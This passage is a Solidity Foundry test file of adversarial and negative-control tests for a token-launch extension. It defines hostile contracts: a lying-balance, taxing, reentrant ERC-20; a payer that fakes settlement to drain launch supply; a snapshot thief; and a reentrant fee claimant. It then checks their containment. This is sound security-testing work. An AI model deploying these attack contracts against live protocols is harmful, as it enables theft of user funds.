// SPDX-License-Identifier: ekubo-license-v1.eth
pragma solidity =0.8.33;

import {Vm} from "forge-std/Vm.sol";
import {console2} from "forge-std/console2.sol";
import {ERC20} from "solady/tokens/ERC20.sol";
import {Ownable} from "solady/auth/Ownable.sol";
import {ICore} from "../../src/interfaces/ICore.sol";
import {IFlashAccountant} from "../../src/interfaces/IFlashAccountant.sol";
import {
    IZeroSeedLaunch,
    ZERO_SEED_LAUNCH_CREATE,
    ZERO_SEED_LAUNCH_CLAIM_FEES
} from "../../src/interfaces/extensions/IZeroSeedLaunch.sol";
import {ZeroSeedLaunch, zeroSeedLaunchCallPoints} from "../../src/extensions/ZeroSeedLaunch.sol";
import {ZeroSeedLaunchPeriphery} from "../../src/ZeroSeedLaunchPeriphery.sol";
import {IZeroSeedLaunchPeriphery} from "../../src/interfaces/IZeroSeedLaunchPeriphery.sol";
import {NATIVE_TOKEN_ADDRESS} from "../../src/math/constants.sol";
import {MintableERC20} from "../../src/MintableERC20.sol";
import {BaseLocker} from "../../src/base/BaseLocker.sol";
import {CoreLib} from "../../src/libraries/CoreLib.sol";
import {CoreStorageLayout} from "../../src/libraries/CoreStorageLayout.sol";
import {FlashAccountantLib} from "../../src/libraries/FlashAccountantLib.sol";
import {StorageSlot} from "../../src/types/storageSlot.sol";
import {PoolKey} from "../../src/types/poolKey.sol";
import {PoolId} from "../../src/types/poolId.sol";
import {PoolConfig} from "../../src/types/poolConfig.sol";
import {PoolState} from "../../src/types/poolState.sol";
import {PoolBalanceUpdate} from "../../src/types/poolBalanceUpdate.sol";
import {SwapParameters, createSwapParameters} from "../../src/types/swapParameters.sol";
import {SqrtRatio, MIN_SQRT_RATIO} from "../../src/types/sqrtRatio.sol";
import {PositionId, createPositionId} from "../../src/types/positionId.sol";
import {createConcentratedPoolConfig} from "../../src/types/poolConfig.sol";
import {computeFee, amountBeforeFee} from "../../src/math/fee.sol";
import {tickToSqrtRatio} from "../../src/math/ticks.sol";
import {ZeroSeedLaunchBase, DecimalsToken} from "./ZeroSeedLaunch.t.sol";

// Adversarial tests and negative controls for quote isolation on a shared extension. Local tests only.

interface IQuoteHook {
    function onQuoteTransfer(address from, address to, uint256 amount) external;
}

address constant CORE_ADDR = 0x00000000000014aA86C5d3c41765bb24e11bd701;

/// @dev Hostile quote: transfer tax (all or only out of Core), lying balanceOf(Core), outbound block, negative rebase
/// and a post-transfer callback.
contract EvilQuote is ERC20 {
    uint256 public taxBps;
    bool public taxOnlyFromCore;
    uint256 public inflate;
    bool public blockFromCore;
    address public hook;
    bool private _inHook;

    constructor(address recipient, uint8) {
        _mint(recipient, type(uint128).max);
    }

    function name() public pure override returns (string memory) {
        return "Evil";
    }

    function symbol() public pure override returns (string memory) {
        return "EVIL";
    }

    function setTax(uint256 bps, bool onlyFromCore) external {
        taxBps = bps;
        taxOnlyFromCore = onlyFromCore;
    }

    function setInflate(uint256 v) external {
        inflate = v;
    }

    function setBlockFromCore(bool v) external {
        blockFromCore = v;
    }

    function setHook(address h) external {
        hook = h;
    }

    function balanceOf(address a) public view override returns (uint256) {
        return super.balanceOf(a) + (a == CORE_ADDR ? inflate : 0);
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        _move(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        _spendAllowance(from, msg.sender, amount);
        _move(from, to, amount);
        return true;
    }

    function _move(address from, address to, uint256 amount) internal {
        if (blockFromCore && from == CORE_ADDR) revert("blocked");
        uint256 tax = (!taxOnlyFromCore || from == CORE_ADDR) ? amount * taxBps / 10_000 : 0;
        if (tax != 0) _burn(from, tax);
        _transfer(from, to, amount - tax);
        if (hook != address(0) && !_inHook) {
            _inHook = true;
            IQuoteHook(hook).onQuoteTransfer(from, to, amount);
            _inHook = false;
        }
    }
}

/// @dev Quote controller that pays nothing: forwards a buy, then fakes the payment by inflating balanceOf(Core).
contract LyingPayer is BaseLocker {
    using FlashAccountantLib for *;

    constructor(ICore core) BaseLocker(core) {}

    function drain(PoolKey memory key, SwapParameters params, address quote, address token)
        external
        returns (uint256 tokenOut, uint256 quoteOwed)
    {
        return abi.decode(lock(abi.encode(key, params, quote, token)), (uint256, uint256));
    }

    function handleLockData(uint256, bytes memory data) internal override returns (bytes memory) {
        (PoolKey memory key, SwapParameters params, address quote, address token) =
            abi.decode(data, (PoolKey, SwapParameters, address, address));
        (PoolBalanceUpdate u,) = abi.decode(
            ACCOUNTANT.forward(key.config.extension(), abi.encode(key, params)), (PoolBalanceUpdate, PoolState)
        );
        bool tokenIs0 = key.token0 == token;
        int128 q = tokenIs0 ? u.delta1() : u.delta0();
        int128 t = tokenIs0 ? u.delta0() : u.delta1();
        (bool s1,) = address(ACCOUNTANT).call(bytes.concat(IFlashAccountant.startPayments.selector, abi.encode(quote)));
        EvilQuote(quote).setInflate(EvilQuote(quote).inflate() + uint128(q));
        (bool s2,) =
            address(ACCOUNTANT).call(bytes.concat(IFlashAccountant.completePayments.selector, abi.encode(quote)));
        require(s1 && s2);
        ACCOUNTANT.withdraw(token, address(this), uint128(-t));
        return abi.encode(uint256(uint128(-t)), uint256(uint128(q)));
    }
}

/// @dev During a payer's settlement, opens a nested lock and tries to take the outer lock's payment snapshot.
contract SnapshotThief is BaseLocker, IQuoteHook {
    using FlashAccountantLib for *;

    address immutable quote;
    bool armed;

    constructor(ICore core, address q) BaseLocker(core) {
        quote = q;
    }

    function arm() external {
        armed = true;
    }

    function onQuoteTransfer(address, address to, uint256 amount) external {
        if (!armed || to != CORE_ADDR) return;
        armed = false;
        lock(abi.encode(amount));
    }

    function handleLockData(uint256, bytes memory data) internal override returns (bytes memory) {
        uint256 amount = abi.decode(data, (uint256));
        (bool ok,) =
            address(ACCOUNTANT).call(bytes.concat(IFlashAccountant.completePayments.selector, abi.encode(quote)));
        require(ok);
        ACCOUNTANT.withdraw(quote, address(this), uint128(amount));
        return "";
    }
}

/// @dev Reaches Core entry points as a third-party locker.
contract RawLocker is BaseLocker {
    constructor(ICore core) BaseLocker(core) {}

    function run(bytes memory call_) external returns (bytes memory) {
        return lock(call_);
    }

    function handleLockData(uint256, bytes memory data) internal override returns (bytes memory) {
        (bool ok, bytes memory r) = address(ACCOUNTANT).call(data);
        if (!ok) {
            assembly ("memory-safe") {
                revert(add(r, 32), mload(r))
            }
        }
        return r;
    }
}

abstract contract AdversarialBase is ZeroSeedLaunchBase {
    using CoreLib for ICore;

    function _evilAt(address at) internal returns (EvilQuote evil) {
        deployCodeTo("ZeroSeedLaunchAdversarial.t.sol:EvilQuote", abi.encode(address(this), uint8(18)), at);
        evil = EvilQuote(at);
        evil.approve(address(swapper), type(uint256).max);
    }

    function _createWith(address who)
        internal
        returns (IZeroSeedLaunch.Installation memory inst, IZeroSeedLaunch.LaunchParameters memory p)
    {
        p = _parameters(ASK_18_18, REQUESTED_SUPPLY, DECAY_RATE);
        _bind(p, who);
        vm.prank(who);
        inst = periphery.create(p);
        MintableERC20(inst.token).approve(address(swapper), type(uint256).max);
    }

    /// @dev Exercise a different quote on the SAME extension and periphery, with a distinct token salt.
    function _secondLaunch(address quote)
        internal
        returns (ZeroSeedLaunch second, ZeroSeedLaunchPeriphery secondPeriphery)
    {
        activeQuote = quote;
        second = launch;
        secondPeriphery = periphery;
    }

    /// @dev Creates a distinct launch for the selected quote through the shared periphery.
    function _createOn(ZeroSeedLaunchPeriphery via, address who)
        internal
        returns (IZeroSeedLaunch.Installation memory inst, IZeroSeedLaunch.LaunchParameters memory p)
    {
        p = _parameters(ASK_18_18, REQUESTED_SUPPLY, DECAY_RATE);
        p.salt = keccak256(abi.encode("other quote", activeQuote));
        IZeroSeedLaunch.Installation memory preview = via.previewInstallation(who, p);
        assertLe(preview.installedSupply, p.supply);
        vm.prank(who);
        inst = via.create(p);
    }

    function _ledgerAndPrincipal(IZeroSeedLaunch.Installation memory inst) internal view returns (bytes32 h) {
        (uint128 f0, uint128 f1) = launch.creatorFees(inst.poolKey);
        (uint128 p0, uint128 p1) = _principal(inst);
        h = keccak256(
            abi.encode(
                f0,
                f1,
                p0,
                p1,
                _balance(inst.poolKey.token0, CORE),
                _balance(inst.poolKey.token1, CORE),
                PoolState.unwrap(ICore(CORE).poolState(inst.poolKey.toPoolId()))
            )
        );
    }
}

/// Native, plain and hostile quote tokens share an extension; accounting and authority remain per pool.
contract ZeroSeedLaunchQuoteTest is AdversarialBase {
    using CoreLib for ICore;

    function test_launch_acceptsNative_refusesCodeless() public {
        IZeroSeedLaunch.LaunchParameters memory p = _parameters(ASK_18_18, REQUESTED_SUPPLY, DECAY_RATE);
        p.quoteToken = address(0xdead);
        vm.expectRevert(IZeroSeedLaunch.UnsupportedQuoteToken.selector);
        periphery.previewInstallation(creator, p);
        vm.prank(creator);
        vm.expectRevert(IZeroSeedLaunch.UnsupportedQuoteToken.selector);
        periphery.create(p);
        p.quoteToken = NATIVE_TOKEN_ADDRESS;
        vm.prank(creator);
        IZeroSeedLaunch.Installation memory inst = periphery.create(p);
        assertEq(inst.poolKey.token0, NATIVE_TOKEN_ADDRESS);
    }

    function test_quoteToken_erc20AndNative_sameExtension() public {
        assertGt(QUOTE_HIGH.code.length, 0, "plain ERC-20 fixture");
        assertEq(ERC20(QUOTE_HIGH).decimals(), 18);
        assertEq(ERC20(QUOTE_HIGH).symbol(), "Q");
        assertEq(ERC20(QUOTE_HIGH).name(), "Quote");
        bytes32 highHash = address(launch).codehash;
        (IZeroSeedLaunch.Installation memory erc20,) = _createWith(creator);
        bytes32 before = _ledgerAndPrincipal(erc20);
        activeQuote = NATIVE_TOKEN_ADDRESS;
        (IZeroSeedLaunch.Installation memory nativeLaunch,) = _createOn(periphery, creator);
        assertEq(nativeLaunch.poolKey.token0, NATIVE_TOKEN_ADDRESS);
        assertEq(erc20.poolKey.config.extension(), nativeLaunch.poolKey.config.extension());
        assertEq(highHash, address(launch).codehash);
        assertEq(_ledgerAndPrincipal(erc20), before);
    }

    /// @dev An existing launch cannot be rebound to a different quote by forging its pool key.
    function test_unsupportedQuote_integrationRefusal() public {
        (IZeroSeedLaunch.Installation memory erc20Launch,) = _createWith(creator);
        bytes32 before = _ledgerAndPrincipal(erc20Launch);
        EvilQuote evil = _evilAt(QUOTE_LOW);
        PoolKey memory key = PoolKey({token0: QUOTE_LOW, token1: erc20Launch.token, config: erc20Launch.poolKey.config});
        vm.expectRevert(IZeroSeedLaunch.InitializeThroughCreateOnly.selector);
        ICore(CORE).initializePool(key, 0);
        vm.warp(START);
        vm.expectRevert(IZeroSeedLaunch.UnknownLaunch.selector);
        swapper.forwardSwap(key, createSwapParameters(SqrtRatio.wrap(0), 1e18, false, 0));
        LyingPayer attacker = new LyingPayer(ICore(CORE));
        vm.expectRevert(IZeroSeedLaunch.UnknownLaunch.selector);
        attacker.drain(key, createSwapParameters(SqrtRatio.wrap(0), -1e24, true, 0), address(evil), erc20Launch.token);
        assertEq(_ledgerAndPrincipal(erc20Launch), before, "ERC-20 launch untouched");
    }

    /// @dev A lying quote takes its paired launch inventory and, as `ZeroSeedLaunchSharedQuoteTest` shows, any real
    /// balance of the same quote that Core holds for other pools. Native and plain-quote pools on the SAME
    /// extension/periphery retain their principal, balances, state and fee ledgers.
    function test_hostileQuoteDrain_isolatedFromNativeAndERC20Launches() public {
        (IZeroSeedLaunch.Installation memory erc20Launch,) = _createWith(creator);
        vm.warp(START);
        _buy(erc20Launch.poolKey, erc20Launch.token, 1e18, false);
        bytes32 before = _ledgerAndPrincipal(erc20Launch);
        activeQuote = NATIVE_TOKEN_ADDRESS;
        (IZeroSeedLaunch.Installation memory nativeLaunch,) = _createOn(periphery, creator);
        _buy(nativeLaunch.poolKey, nativeLaunch.token, 1e18, false);
        bytes32 nativeBefore = _ledgerAndPrincipal(nativeLaunch);
        EvilQuote evil = _evilAt(QUOTE_LOW);
        (, ZeroSeedLaunchPeriphery hostilePeriphery) = _secondLaunch(address(evil));
        (IZeroSeedLaunch.Installation memory inst,) = _createOn(hostilePeriphery, creator);
        vm.warp(START);
        LyingPayer attacker = new LyingPayer(ICore(CORE));
        bool tokenIs1 = inst.poolKey.token1 == inst.token;
        (uint256 got, uint256 owed) = attacker.drain(
            inst.poolKey,
            createSwapParameters(SqrtRatio.wrap(0), -int128(uint128(inst.installedSupply)), tokenIs1, 0),
            address(evil),
            inst.token
        );
        assertEq(evil.balanceOf(address(attacker)), 0, "attacker paid no real quote");
        assertGt(got * 1e6, uint256(inst.installedSupply) * 999_999, "~all supply taken");
        console2.log("VEC|adversarial|hostileQuoteDrain|got=", got, "fakePaid=", owed);
        assertEq(_ledgerAndPrincipal(erc20Launch), before, "ERC-20 launch untouched");
        assertEq(_ledgerAndPrincipal(nativeLaunch), nativeBefore, "native launch untouched");
    }

    /// @dev I-4 rerun next to the plain ERC-20 deployment: a hostile-callback quote steals the in-flight payment snapshot in
    /// a nested lock, the outer settlement reverts, nothing is taken, and the plain ERC-20 launch is unaffected.
    function test_settlementSnapshotTheft_failsClosed_erc20LaunchUnaffected() public {
        (IZeroSeedLaunch.Installation memory erc20Launch,) = _createWith(creator);
        EvilQuote evil = _evilAt(QUOTE_LOW);
        (, ZeroSeedLaunchPeriphery hostilePeriphery) = _secondLaunch(address(evil));
        (IZeroSeedLaunch.Installation memory inst,) = _createOn(hostilePeriphery, creator);
        SnapshotThief thief = new SnapshotThief(ICore(CORE), address(evil));
        evil.setHook(address(thief));
        vm.warp(START);
        thief.arm();
        bytes32 hostileBefore = PoolState.unwrap(ICore(CORE).poolState(inst.poolKey.toPoolId()));
        vm.expectRevert(); // outer DebtsNotZeroed: the stolen credit is the outer payment
        _buy(inst.poolKey, inst.token, 10e18, false);
        assertEq(evil.balanceOf(address(thief)), 0, "nothing stolen");
        assertEq(PoolState.unwrap(ICore(CORE).poolState(inst.poolKey.toPoolId())), hostileBefore);
        // The plain ERC-20 launch trades normally afterwards and keeps its ledger.
        PoolBalanceUpdate u = _buy(erc20Launch.poolKey, erc20Launch.token, 1e18, false);
        assertGt(uint128(-u.delta0()), 0, "ERC-20 launch trades");
        _assertLedger(erc20Launch, QUOTE_HIGH, 1e18, 0, MAX_DUST);
    }
}

/// L-1 / L-2: recipient sinks refused, claim is atomic over both assets, native payout to EOA and contract
/// recipients, reverting and reentering recipients.
contract ZeroSeedLaunchClaimTest is AdversarialBase {
    using CoreLib for ICore;

    function _withFees(bool tokenIs0) internal returns (IZeroSeedLaunch.Installation memory inst) {
        (inst,) = _create(tokenIs0, 18, DECAY_RATE);
        vm.warp(START);
        _buy(inst.poolKey, inst.token, 10e18, false); // fee in launch token
        _buy(inst.poolKey, inst.token, 1e24, true); // fee in quote
        (uint128 f0, uint128 f1) = launch.creatorFees(inst.poolKey);
        assertGt(f0, 0);
        assertGt(f1, 0);
    }

    function test_claim_sinkRecipientsRefused_stateUnchanged_bothOrders() public {
        for (uint256 i; i < 2; i++) {
            uint256 snap = vm.snapshotState();
            IZeroSeedLaunch.Installation memory inst = _withFees(i == 0);
            bytes32 before = _ledgerAndPrincipal(inst);
            address[6] memory sinks =
                [address(0), CORE, address(launch), address(periphery), inst.poolKey.token0, inst.poolKey.token1];
            for (uint256 k; k < sinks.length; k++) {
                vm.prank(creator);
                vm.expectRevert(IZeroSeedLaunchPeriphery.InvalidRecipient.selector);
                periphery.claimFees(inst.poolKey, sinks[k]);
                assertEq(_ledgerAndPrincipal(inst), before, "ledger, principal and Core balances unchanged");
            }
            // Valid alternatives: the owner itself, an EOA and a contract that is not a sink (the swapper accepts
            // ETH).
            address[3] memory ok = [creator, feeRecipient, address(swapper)];
            (uint128 f0, uint128 f1) = launch.creatorFees(inst.poolKey);
            vm.prank(creator);
            (uint128 c0, uint128 c1) = periphery.claimFees(inst.poolKey, ok[0]);
            assertEq(c0, f0);
            assertEq(c1, f1);
            assertEq(_balance(inst.poolKey.token0, creator), f0, "owner paid 0");
            assertEq(_balance(inst.poolKey.token1, creator), f1, "owner paid 1");
            _buy(inst.poolKey, inst.token, 1e18, false);
            vm.prank(creator);
            (c0, c1) = periphery.claimFees(inst.poolKey, ok[1]);
            assertGt(uint256(c0) + c1, 0);
            assertEq(ERC20(inst.token).balanceOf(ok[1]), inst.poolKey.token0 == inst.token ? c0 : c1);
            _buy(inst.poolKey, inst.token, 1e18, false);
            uint256 swapperQuote = _balance(activeQuote, address(swapper));
            vm.prank(creator);
            (c0, c1) = periphery.claimFees(inst.poolKey, ok[2]);
            assertEq(
                _balance(activeQuote, address(swapper)) - swapperQuote,
                inst.poolKey.token0 == activeQuote ? c0 : c1,
                "contract recipient paid"
            );
            assertEq(address(launch).balance, 0, "extension holds no ETH");
            assertEq(address(periphery).balance, 0, "periphery holds no ETH");
            vm.revertToState(snap);
        }
    }

    /// @dev Fault injection: the quote payment to the recipient fails (a refused ERC-20 transfer for the token0 order,
    /// a reverting receiver for the native order). Both ledgers, principal and Core balances roll back; a retry to
    /// another recipient pays both assets in full.
    function test_claim_atomicRollback_bothOrders() public {
        for (uint256 i; i < 2; i++) {
            uint256 snap = vm.snapshotState();
            IZeroSeedLaunch.Installation memory inst = _withFees(i == 0);
            (uint128 f0, uint128 f1) = launch.creatorFees(inst.poolKey);
            bool tokenIs0 = inst.poolKey.token0 == inst.token;
            address quote = tokenIs0 ? inst.poolKey.token1 : inst.poolKey.token0;
            uint128 quoteFee = tokenIs0 ? f1 : f0;
            bytes32 before = _ledgerAndPrincipal(inst);
            address target = feeRecipient;
            if (quote == NATIVE_TOKEN_ADDRESS) {
                target = address(new RevertingReceiver());
                vm.prank(creator);
                vm.expectRevert(bytes4(0xb12d13eb)); // Core: ETHTransferFailed()
            } else {
                vm.mockCallRevert(quote, abi.encodeCall(ERC20.transfer, (feeRecipient, quoteFee)), "refused");
                vm.prank(creator);
                vm.expectRevert();
            }
            periphery.claimFees(inst.poolKey, target);
            assertEq(_ledgerAndPrincipal(inst), before, "both ledgers rolled back");
            assertEq(ERC20(inst.token).balanceOf(target), 0, "no token side paid");
            vm.clearMockedCalls();
            address retry = makeAddr("retry");
            vm.prank(creator);
            (uint128 c0, uint128 c1) = periphery.claimFees(inst.poolKey, retry);
            assertEq(c0, f0);
            assertEq(c1, f1);
            assertEq(_balance(inst.poolKey.token0, retry), f0);
            assertEq(_balance(inst.poolKey.token1, retry), f1);
            vm.revertToState(snap);
        }
    }

    /// @dev Native order: an owner contract that re-enters `claimFees` while receiving its ETH finds the ledger
    /// already moved onto the lock; the second claim pays nothing and the ETH is paid exactly once.
    function test_reentrantClaim_native_noDoubleSpend() public {
        _quote(false, 18);
        assertEq(activeQuote, NATIVE_TOKEN_ADDRESS);
        ReentrantOwner owner = new ReentrantOwner(periphery, launch);
        IZeroSeedLaunch.LaunchParameters memory p = _parameters(ASK_18_18, REQUESTED_SUPPLY, DECAY_RATE);
        _bind(p, address(owner));
        IZeroSeedLaunch.Installation memory inst = owner.createLaunch(p);
        MintableERC20(inst.token).approve(address(swapper), type(uint256).max);
        vm.warp(START);
        _buy(inst.poolKey, inst.token, 10e18, true); // quote (ETH) fee
        _buy(inst.poolKey, inst.token, 10e18, false); // token fee
        (uint128 f0, uint128 f1) = launch.creatorFees(inst.poolKey);
        assertGt(f0, 0, "ETH fee");
        assertGt(f1, 0, "token fee");
        (uint128 c0, uint128 c1) = owner.claim();
        assertEq(c0, f0);
        assertEq(c1, f1);
        assertTrue(owner.reentered(), "re-entered during the ETH payment");
        assertEq(owner.second0() + owner.second1(), 0, "re-entrant claim gets nothing");
        assertEq(owner.viewDuring0() + owner.viewDuring1(), 0, "ledger cleared before the payment");
        assertEq(address(owner).balance, f0, "ETH paid once");
        assertEq(ERC20(inst.token).balanceOf(address(owner)), f1, "token paid once");
        assertEq(address(launch).balance, 0, "extension holds no ETH");
        assertEq(address(periphery).balance, 0, "periphery holds no ETH");
        (f0, f1) = launch.creatorFees(inst.poolKey);
        assertEq(f0 + f1, 0, "ledger empty");
    }

    /// @dev A hostile-callback ERC-20 quote on a second instance: the owner contract re-enters through the quote's
    /// transfer hook. Same outcome as the native case.
    function test_reentrantClaim_noDoubleSpend_hostileInstance() public {
        EvilQuote evil = _evilAt(QUOTE_LOW);
        (ZeroSeedLaunch hostile, ZeroSeedLaunchPeriphery hostilePeriphery) = _secondLaunch(address(evil));
        ReentrantOwner rc = new ReentrantOwner(hostilePeriphery, hostile);
        IZeroSeedLaunch.LaunchParameters memory p = _parameters(ASK_18_18, REQUESTED_SUPPLY, DECAY_RATE);
        IZeroSeedLaunch.Installation memory preview = hostilePeriphery.previewInstallation(address(rc), p);
        assertLe(preview.installedSupply, p.supply);
        IZeroSeedLaunch.Installation memory inst = rc.createLaunch(p);
        MintableERC20(inst.token).approve(address(swapper), type(uint256).max);
        vm.warp(START);
        _buy(inst.poolKey, inst.token, 10e18, true);
        _buy(inst.poolKey, inst.token, 10e18, false);
        (uint128 f0, uint128 f1) = hostile.creatorFees(inst.poolKey);
        evil.setHook(address(rc));
        (uint128 c0, uint128 c1) = rc.claim();
        assertEq(c0, f0);
        assertEq(c1, f1);
        assertTrue(rc.reentered());
        assertEq(rc.second0() + rc.second1(), 0, "re-entrant claim gets nothing");
        assertEq(rc.viewDuring0() + rc.viewDuring1(), 0, "ledger cleared before transfer");
        assertEq(evil.balanceOf(address(rc)), inst.poolKey.token0 == address(evil) ? f0 : f1, "quote paid once");
    }

    /// @dev Ownership is the periphery's: a transfer moves the claim right, including unclaimed fees; the extension
    /// still sees the periphery as controller.
    function test_transferLaunch_movesFeeRights() public {
        IZeroSeedLaunch.Installation memory inst = _withFees(false);
        PoolId id = inst.poolKey.toPoolId();
        address next = makeAddr("next");
        vm.expectRevert(IZeroSeedLaunchPeriphery.OwnerOnly.selector);
        periphery.transferLaunch(id, next);
        vm.prank(creator);
        vm.expectRevert(IZeroSeedLaunchPeriphery.InvalidOwner.selector);
        periphery.transferLaunch(id, address(0));
        vm.prank(creator);
        vm.expectEmit(address(periphery));
        emit IZeroSeedLaunchPeriphery.LaunchOwnerChanged(id, creator, next);
        periphery.transferLaunch(id, next);
        assertEq(periphery.launchOwner(id), next);
        assertEq(launch.getLaunch(id).controller, address(periphery), "controller unchanged");
        vm.prank(creator);
        vm.expectRevert(IZeroSeedLaunchPeriphery.OwnerOnly.selector);
        periphery.claimFees(inst.poolKey, creator);
        (uint128 f0, uint128 f1) = launch.creatorFees(inst.poolKey);
        vm.prank(next);
        (uint128 c0, uint128 c1) = periphery.claimFees(inst.poolKey, next);
        assertEq(c0, f0);
        assertEq(c1, f1);
        assertEq(next.balance, f0, "ETH to the new owner");
    }
}

/// @dev Refuses ETH: a recipient that cannot be paid.
contract RevertingReceiver {
    receive() external payable {
        revert("no");
    }
}

/// @dev Owner contract whose ETH receipt (or hostile-quote hook) re-enters `claimFees`.
contract ReentrantOwner is IQuoteHook {
    ZeroSeedLaunchPeriphery immutable periphery;
    IZeroSeedLaunch immutable launch;
    PoolKey key;
    bool public reentered;
    uint128 public second0;
    uint128 public second1;
    uint128 public viewDuring0;
    uint128 public viewDuring1;

    constructor(ZeroSeedLaunchPeriphery p, IZeroSeedLaunch l) {
        periphery = p;
        launch = l;
    }

    function createLaunch(IZeroSeedLaunch.LaunchParameters memory p)
        external
        returns (IZeroSeedLaunch.Installation memory inst)
    {
        inst = periphery.create(p);
        key = inst.poolKey;
    }

    function claim() external returns (uint128, uint128) {
        return periphery.claimFees(key, address(this));
    }

    function _reenter() private {
        if (reentered) return;
        reentered = true;
        (viewDuring0, viewDuring1) = launch.creatorFees(key);
        (second0, second1) = periphery.claimFees(key, address(this));
    }

    receive() external payable {
        _reenter();
    }

    function onQuoteTransfer(address, address to, uint256) external {
        if (to != address(this)) return;
        _reenter();
    }
}

/// L-4 and L-3: shared preview/create validation, collision refusal, start boundaries.
contract ZeroSeedLaunchPreviewStartTest is AdversarialBase {
    using CoreLib for ICore;

    function test_metadataBounds_sharedByPreviewAndCreate() public {
        IZeroSeedLaunch.LaunchParameters memory p = _parameters(ASK_18_18, REQUESTED_SUPPLY, DECAY_RATE);
        string memory len31 = "abcdefghijklmnopqrstuvwxyz01234";
        string memory len32 = "abcdefghijklmnopqrstuvwxyz012345";
        for (uint256 field; field < 2; field++) {
            IZeroSeedLaunch.LaunchParameters memory q = abi.decode(abi.encode(p), (IZeroSeedLaunch.LaunchParameters));
            if (field == 0) q.name = len32;
            else q.symbol = len32;
            vm.expectRevert(IZeroSeedLaunch.MetadataTooLong.selector);
            periphery.previewInstallation(creator, q);
            vm.prank(creator);
            vm.expectRevert(IZeroSeedLaunch.MetadataTooLong.selector);
            periphery.create(q);
        }
        p.name = len31;
        p.symbol = len31;
        _bind(p, creator);
        vm.prank(creator);
        IZeroSeedLaunch.Installation memory inst = periphery.create(p);
        assertEq(MintableERC20(inst.token).name(), len31);
        assertEq(MintableERC20(inst.token).symbol(), len31);
        // The bound is in bytes, not characters: 11 three-byte characters (33 bytes) are refused.
        p.salt = bytes32(uint256(2));
        p.name = unicode"€€€€€€€€€€€";
        vm.expectRevert(IZeroSeedLaunch.MetadataTooLong.selector);
        periphery.previewInstallation(creator, p);
    }

    function test_collision_refusedPredictably_otherSaltOrMetadataIndependent() public {
        (IZeroSeedLaunch.Installation memory first, IZeroSeedLaunch.LaunchParameters memory p) =
            _create(true, 18, DECAY_RATE);
        bytes memory exists = abi.encodeWithSelector(IZeroSeedLaunch.LaunchTokenExists.selector, first.token);
        vm.expectRevert(exists);
        periphery.previewInstallation(creator, p);
        vm.prank(creator);
        vm.expectRevert(exists);
        periphery.create(p);
        // Same salt, different metadata: different token address, accepted.
        IZeroSeedLaunch.LaunchParameters memory q = abi.decode(abi.encode(p), (IZeroSeedLaunch.LaunchParameters));
        q.symbol = "ZERO2";
        q.supply = REQUESTED_SUPPLY;
        _bind(q, creator);
        vm.prank(creator);
        IZeroSeedLaunch.Installation memory second = periphery.create(q);
        assertTrue(second.token != first.token, "distinct token");
        // Different salt, same metadata: accepted.
        q = abi.decode(abi.encode(p), (IZeroSeedLaunch.LaunchParameters));
        q.salt = bytes32(uint256(99));
        q.supply = REQUESTED_SUPPLY;
        _bind(q, creator);
        vm.prank(creator);
        periphery.create(q);
    }

    /// @dev Contract-side start boundaries at block time T. These are the only rules the contract enforces; it has
    /// no start-delay cap. Producer rules (margin, cap, expiry <= start) live in the vectors file.
    function test_startBoundaries() public {
        uint64 t = 5000;
        vm.warp(t);
        IZeroSeedLaunch.LaunchParameters memory p = _parameters(ASK_18_18, REQUESTED_SUPPLY, DECAY_RATE);
        uint64[5] memory starts = [t - 1, t, t + 1, t + 86_400, type(uint64).max];
        for (uint256 i; i < starts.length; i++) {
            uint256 snap = vm.snapshotState();
            p.tradingStart = starts[i];
            p.supply = REQUESTED_SUPPLY;
            if (starts[i] < t) {
                vm.expectRevert(IZeroSeedLaunch.InvalidTradingStart.selector);
                periphery.previewInstallation(creator, p);
                vm.prank(creator);
                vm.expectRevert(IZeroSeedLaunch.InvalidTradingStart.selector);
                periphery.create(p);
                console2.log(string.concat("VEC|start|T=5000|start=", _ustr(starts[i]), "|create=InvalidTradingStart"));
                vm.revertToState(snap);
                continue;
            }
            _bind(p, creator);
            vm.prank(creator);
            IZeroSeedLaunch.Installation memory inst = periphery.create(p);
            MintableERC20(inst.token).approve(address(swapper), type(uint256).max);
            if (starts[i] > t) {
                vm.expectRevert(IZeroSeedLaunch.TradingNotStarted.selector);
                _buy(inst.poolKey, inst.token, 1e18, false);
            }
            if (starts[i] < type(uint64).max) {
                vm.warp(starts[i]);
                _buy(inst.poolKey, inst.token, 1e18, false);
            } else {
                vm.warp(t + 100 * 365 days);
                vm.expectRevert(IZeroSeedLaunch.TradingNotStarted.selector);
                _buy(inst.poolKey, inst.token, 1e18, false);
            }
            console2.log(
                string.concat(
                    "VEC|start|T=5000|start=",
                    _ustr(starts[i]),
                    "|create=ok|tradeAtT=",
                    starts[i] == t ? "ok" : "TradingNotStarted",
                    "|tradeAtStart=",
                    starts[i] == type(uint64).max ? "notExercised" : "ok"
                )
            );
            vm.revertToState(snap);
        }
        // A plan previewed with start == T and mined at T + 1 is refused atomically: nothing is left behind.
        p.tradingStart = t;
        p.supply = REQUESTED_SUPPLY;
        _bind(p, creator);
        IZeroSeedLaunch.Installation memory planned = periphery.previewInstallation(creator, p);
        vm.warp(t + 1);
        vm.prank(creator);
        vm.expectRevert(IZeroSeedLaunch.InvalidTradingStart.selector);
        periphery.create(p);
        assertEq(planned.token.code.length, 0, "no token");
        assertFalse(ICore(CORE).poolState(planned.poolKey.toPoolId()).isInitialized(), "no pool");
    }
}

/// Fee sign/conservation per forwarded swap on the plain ERC-20 fixture, from the emitted event and the Core ledger.
contract ZeroSeedLaunchFeeEventTest is AdversarialBase {
    using CoreLib for ICore;

    bytes32 constant SWAPPED = keccak256("LaunchSwapped(bytes32,address,int128,int128,uint64,uint128,bool)");

    struct Obs {
        int128 d0;
        int128 d1;
        uint64 rate;
        uint128 fee;
        bool feeIs1;
    }

    function _lastSwapped() internal returns (Obs memory o) {
        Vm.Log[] memory logs = vm.getRecordedLogs();
        for (uint256 i = logs.length; i > 0; i--) {
            if (logs[i - 1].topics[0] == SWAPPED) {
                (o.d0, o.d1, o.rate, o.fee, o.feeIs1) =
                    abi.decode(logs[i - 1].data, (int128, int128, uint64, uint128, bool));
                return o;
            }
        }
        revert("no event");
    }

    function testFuzz_feeSignsAndConservation(uint256 seed, bool tokenIs0) public {
        (IZeroSeedLaunch.Installation memory inst,) = _create(tokenIs0, 18, DECAY_RATE);
        PoolKey memory key = inst.poolKey;
        vm.warp(START);
        _buy(key, inst.token, 50e18, false);
        for (uint256 i; i < 8; i++) {
            seed = uint256(keccak256(abi.encode(seed, i)));
